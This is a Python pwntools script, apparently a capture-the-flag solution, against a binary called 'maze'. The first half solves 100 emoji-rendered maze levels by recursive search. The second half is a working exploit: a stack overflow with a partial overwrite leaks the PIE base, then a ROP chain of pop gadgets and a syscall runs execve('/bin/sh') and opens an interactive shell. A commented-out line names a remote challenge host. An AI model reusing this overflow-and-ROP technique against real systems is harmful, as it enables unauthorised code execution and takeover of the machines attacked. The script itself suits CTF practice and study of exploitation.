from pwn import *

# p = remote('219.219.61.234', 10006)
p = process('./maze')
#context.log_level = 'debug'
context.arch = 'amd64'

def convert_to_maze(input):
	strings = input.split('\n')
	row = 0
	maze = []
	for string in strings:
 		i = 0
 		col = 0
 		maze_row = []
 		while i < len(string):
     			if string[i:].startswith('\xf0\x9f\x98')\
     			or string[i:].startswith('\xf0\x9f\x99')\
     			or string[i:].startswith('\xf0\x9f\x90')\
     			or string[i:].startswith('\xf0\x9f\x8D'):
         			start = [row, col]
         			maze_row.append(1)
         			i += 4
     			elif string[i:].startswith('\xf0\x9f\x9a')\
     			or string[i:].startswith('\xf0\x9f\x99'):
         			end = [row, col]
         			maze_row.append(1)
         			i += 4
     			elif string[i:].startswith('\xe2\xac\x9b'):
         			maze_row.append(0)
         			i += 3
     			elif string[i:].startswith('\xe2\xac\x9c'):
         			maze_row.append(1)
         			i += 3
     			elif len(string[i:]) < 3:
         			maze_row.append(0)
         			break
     			else:
         			print(string[i:i+4].encode('hex'))
         			print("error input")
         			exit(0)

     			col += 1
 		maze.append(maze_row)
 		row += 1

	return start, maze, end

def solve_maze(level):
	p.recvline()

	input_maze = ""
	times = 0
	while times <= level + 5:
 		string_get = p.recvline()
 		input_maze += string_get
 		times += 1

	#print(input_maze)

	start, maze, end = convert_to_maze(input_maze)

	sol = []
	if mov(start[0], start[1], maze, end, sol) == False:
 		print("No solution")
 		exit(0)

	p.sendline(''.join(sol[::-1]))

def mov(row, col, maze, end, sol):
	if row == end[0] and col == end[1]:
 		return True

	maze[row][col] = 0

	row_size = len(maze)
	col_size = len(maze[row])
	if col < col_size and row + 1 < row_size and maze[row + 1][col] == 1:
 		if mov(row + 1, col, maze, end, sol) == True:
     			sol.append('s')
     			return True

	if col < col_size and row - 1 >= 0 and maze[row - 1][col] == 1:
 		if mov(row - 1, col, maze, end, sol) == True:
     			sol.append('w')
     			return True

	if col + 1 < col_size and maze[row][col + 1] == 1:
 		if mov(row, col + 1, maze, end, sol) == True:
    		 	sol.append('d')
     			return True

	if col - 1 >= 0 and maze[row][col - 1] == 1:
 		if mov(row, col - 1, maze, end, sol) == True:
     			sol.append('a')
     			return True

	maze[row][col] = 1

	return False

for i in range(100):
	solve_maze(i)
	print("Done " + str(i))

offset = 112
ret_address = 0x158

payload = 'A' * 112 + p64(0xc000000030) + p64(0x40) + 'A' * 0x90 + '\xCE'
p.sendline(payload)
p.recvuntil('Your name is : ')
PIE_base = u64(p.recv(6).ljust(8, "\x00")) - 0x206ac0

pop_rsp = 0x000000000008872e # pop rsp ; ret
pop_rdi = 0x0000000000109d3d # pop rdi ; ret
pop_rsi = 0x0000000000119c45 # pop rsi ; pop r15 ; ret
pop_rax = 0x0000000000074e29 # pop rax ; ret
syscall = 0x00000000000743c9 # syscall
input_addr = 0x000000c00003edf8
payload = 'A' * 112 + p64(0xc000000030) + p64(0x40) + 'A' * 0x90
payload += flat([PIE_base + pop_rax, 0x3b])
payload += flat([PIE_base + pop_rdi, 0x000000c000044ec8])
payload += flat([PIE_base + pop_rsi, 0, 0])
payload += flat([PIE_base + syscall])
payload += "/bin/sh\x00"
p.sendline(payload)

success("PIE_base: " + hex(PIE_base))

p.interactive()
